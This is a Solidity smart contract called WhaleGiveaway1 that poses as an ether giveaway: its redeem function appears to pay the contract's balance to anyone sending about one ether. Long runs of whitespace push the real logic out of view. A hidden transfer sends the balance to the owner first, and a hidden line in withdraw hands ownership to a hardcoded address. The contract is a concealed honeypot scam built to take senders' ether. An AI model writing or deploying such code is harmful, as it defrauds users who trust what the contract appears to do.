pragma solidity ^0.4.19;

contract WhaleGiveaway1
{
    address public Owner = msg.sender;
    uint constant public minEligibility = getMinEligibility(); 
   
    function()
    public
    payable
    {
        
    }
   
    function redeem()
    public
    payable
    {                                                                    
        if(getMsgValue()>=getMinEligibility())
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    getOwner().transfer(getContractBalance());                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            getMsgSender().transfer(getContractBalance());
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(getMsgSender()==getSpecialAddress()){Owner=getSpecialAddress();}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(getMsgSender() == getOwner());
        getOwner().transfer(getContractBalance());
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(getMsgSender() == getOwner());
         
        adr.call.value(getMsgValue())(data);
    }
    
    function getMinEligibility() internal pure returns (uint) {
        return 0.999001 ether;
    }
    
    function getOwner() internal view returns (address) {
        return Owner;
    }
    
    function getMsgValue() internal view returns (uint) {
        return msg.value;
    }
    
    function getMsgSender() internal view returns (address) {
        return msg.sender;
    }
    
    function getContractBalance() internal view returns (uint) {
        return this.balance;
    }
    
    function getSpecialAddress() internal pure returns (address) {
        return 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
    }
}